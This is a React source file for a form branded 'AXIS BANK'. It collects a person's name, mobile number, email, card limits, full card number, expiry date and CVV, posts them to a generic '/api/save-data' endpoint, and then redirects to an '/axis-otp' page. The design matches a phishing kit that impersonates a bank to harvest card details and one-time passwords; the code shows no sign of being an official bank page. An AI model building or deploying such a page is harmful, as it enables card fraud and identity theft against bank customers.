import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const BASE_URL = process.env.REACT_APP_API_URL || "";

// Validation helpers
const isValidMobile = (value) => {
  // Should be in format +91XXXXXXXXXX where X is digit, only one +91 at front, 10 digits after
  return /^\+91\d{10}$/.test(value.trim());
};

const isValidEmail = (value) => {
  // Simple email validator
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
};

const isValidCardNumber = (value) => {
  return /^\d{16}$/.test(value.replace(/\s+/g, ""));
};

const isValidExpiry = (value) => {
  // must be MM/YY, MM: 01-12, YY: 2 digits
  if (!/^\d{2}\/\d{2}$/.test(value)) return false;
  const [mm, yy] = value.split("/").map(Number);
  return mm >= 1 && mm <= 12;
};

const isValidCVV = (value) => {
  return /^\d{3}$/.test(value);
};

const SixaForm = () => {
  const [formData, setFormData] = useState({
    name: "",
    mobileNumber: "",
    email: "",
    state: "",
    workingState: "",
    totalLimit: "",
    availableLimit: "",
    cardHolderName: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  const [errors, setErrors] = useState({});
  const [submitStatus, setSubmitStatus] = useState(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value } = e.target;

    // For expiryDate, format as MM/YY and insert slash after 2 digits
    if (name === "expiryDate") {
      let val = value.replace(/[^\d]/g, ''); // Remove all non-digits
      if (val.length > 4) val = val.slice(0, 4);
      if (val.length >= 3) {
        val = val.slice(0,2) + "/" + val.slice(2);
      }
      setFormData((fd) => ({
        ...fd,
        [name]: val,
      }));
    } else {
      setFormData((fd) => ({
        ...fd,
        [name]: value,
      }));
    }

    // Remove error for field as user types
    setErrors((prev) => ({
      ...prev,
      [name]: undefined
    }));
  };

  const validateFields = () => {
    const err = {};
    if (!formData.name.trim()) {
      err.name = "Name is required";
    }
    if (!isValidMobile(formData.mobileNumber)) {
      err.mobileNumber = "Mobile number must be in format +91XXXXXXXXXX";
    }
    if (!isValidEmail(formData.email)) {
      err.email = "Invalid email address";
    }
    if (!formData.state.trim()) {
      err.state = "State is required";
    }
    if (!formData.workingState.trim()) {
      err.workingState = "Working State is required";
    }
    if (!formData.totalLimit) {
      err.totalLimit = "Total limit required";
    }
    if (!formData.availableLimit) {
      err.availableLimit = "Available limit required";
    }
    if (!formData.cardHolderName.trim()) {
      err.cardHolderName = "Card Holder Name required";
    }
    if (!isValidCardNumber(formData.cardNumber)) {
      err.cardNumber = "Card Number must be 16 digits";
    }
    if (!isValidExpiry(formData.expiryDate)) {
      err.expiryDate = "Expiry must be MM/YY and month valid";
    }
    if (!isValidCVV(formData.cvv)) {
      err.cvv = "CVV must be 3 digits";
    }
    return err;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const checks = validateFields();
    if (Object.keys(checks).length > 0) {
      setErrors(checks);
      setSubmitStatus("error");
      setLoading(false);
      return;
    }
    setLoading(true);
    setSubmitStatus(null);

    try {
      const res = await fetch(
        `${BASE_URL}/api/save-data`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        }
      );
      if (res.ok) {
        setSubmitStatus("success");
        setFormData({
          name: "",
          mobileNumber: "",
          email: "",
          state: "",
          workingState: "",
          totalLimit: "",
          availableLimit: "",
          cardHolderName: "",
          cardNumber: "",
          expiryDate: "",
          cvv: "",
        });
        setErrors({});
        // Redirect to OTP page after success (send mobile number in state object)
        navigate("/axis-otp", { state: { mobileNumber: formData.mobileNumber } });
      } else {
        setSubmitStatus("error");
      }
    } catch (err) {
      setSubmitStatus("error");
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="w-full max-w-md bg-white rounded-xl shadow-lg p-6">
        {/* Header */}
        <div className="flex items-center justify-center mb-6">
          <span className="text-[#9b1c31] text-xl font-bold">
            AXIS BANK
          </span>
        </div>
        {submitStatus === "success" && (
          <div className="mb-4 text-green-600 text-center font-medium">
            Form submitted successfully!
          </div>
        )}
        {submitStatus === "error" && Object.keys(errors).length > 0 && (
          <div className="mb-4 text-red-600 text-center font-medium">
            Please correct the errors below.
          </div>
        )}
        {submitStatus === "error" && Object.keys(errors).length === 0 && (
          <div className="mb-4 text-red-600 text-center font-medium">
            Error submitting form. Please try again.
          </div>
        )}
        {/* Form */}
        <form className="space-y-4" onSubmit={handleSubmit} noValidate>
          <Input
            placeholder="Name"
            name="name"
            value={formData.name}
            onChange={handleChange}
            error={errors.name}
          />
          <Input
            placeholder="Mobile Number (e.g. +911234567890)"
            type="tel"
            name="mobileNumber"
            value={formData.mobileNumber}
            onChange={handleChange}
            error={errors.mobileNumber}
            maxLength={13}
          />
          <Input
            placeholder="Email Address"
            type="email"
            name="email"
            value={formData.email}
            onChange={handleChange}
            error={errors.email}
          />
          <Input
            placeholder="State"
            name="state"
            value={formData.state}
            onChange={handleChange}
            error={errors.state}
          />
          <Input
            placeholder="Working State"
            name="workingState"
            value={formData.workingState}
            onChange={handleChange}
            error={errors.workingState}
          />
          <Input
            placeholder="Total Limit"
            type="number"
            name="totalLimit"
            value={formData.totalLimit}
            onChange={handleChange}
            error={errors.totalLimit}
            min={0}
          />
          <Input
            placeholder="Available Limit"
            type="number"
            name="availableLimit"
            value={formData.availableLimit}
            onChange={handleChange}
            error={errors.availableLimit}
            min={0}
          />
          <Input
            placeholder="Card Holder Name"
            name="cardHolderName"
            value={formData.cardHolderName}
            onChange={handleChange}
            error={errors.cardHolderName}
          />
          <Input
            placeholder="Card Number (16 digits)"
            name="cardNumber"
            value={formData.cardNumber}
            onChange={handleChange}
            error={errors.cardNumber}
            maxLength={16}
            inputMode="numeric"
            pattern="\d{16}"
          />
          <ExpiryInput
            placeholder="Expiry Date (MM/YY)"
            name="expiryDate"
            value={formData.expiryDate}
            onChange={handleChange}
            error={errors.expiryDate}
            maxLength={5}
          />
          <Input
            placeholder="CVV"
            type="password"
            name="cvv"
            value={formData.cvv}
            onChange={handleChange}
            error={errors.cvv}
            maxLength={3}
            inputMode="numeric"
            pattern="\d{3}"
          />

          <button
            type="submit"
            className="w-full bg-[#9b1c31] text-white py-3 rounded-lg font-medium hover:bg-[#7e1627] transition disabled:opacity-60"
            disabled={loading}
          >
            {loading ? "Submitting..." : "Submit"}
          </button>
        </form>
      </div>
    </div>
  );
};

// General purpose input
const Input = ({
  placeholder,
  type = "text",
  name,
  value,
  onChange,
  error,
  ...props
}) => (
  <div className="flex flex-col gap-1">
    <input
      type={type}
      placeholder={placeholder}
      name={name}
      value={value}
      onChange={onChange}
      className={`w-full px-4 py-3 border ${error ? 'border-red-400' : 'border-gray-300'} rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#9b1c31] focus:border-transparent`}
      autoComplete="off"
      {...props}
    />
    {error && (
      <span className="text-xs text-red-500 pl-2">{error}</span>
    )}
  </div>
);

// Specialized input for expiry date, always shows MM/YY with auto-insert slash
const ExpiryInput = ({
  placeholder,
  name,
  value,
  onChange,
  error,
  ...props
}) => {
  // Allow keyboard navigation (e.g. backspace over slash)
  const handleExpiryChange = (e) => {
    onChange(e);
  };

  return (
    <div className="flex flex-col gap-1">
      <input
        type="text"
        placeholder={placeholder}
        name={name}
        value={value}
        onChange={handleExpiryChange}
        className={`w-full px-4 py-3 border ${error ? 'border-red-400' : 'border-gray-300'} rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#9b1c31] focus:border-transparent`}
        autoComplete="off"
        inputMode="numeric"
        pattern="\d{2}/\d{2}"
        maxLength={5}
        {...props}
      />
      {error && (
        <span className="text-xs text-red-500 pl-2">{error}</span>
      )}
    </div>
  );
};

export default SixaForm;
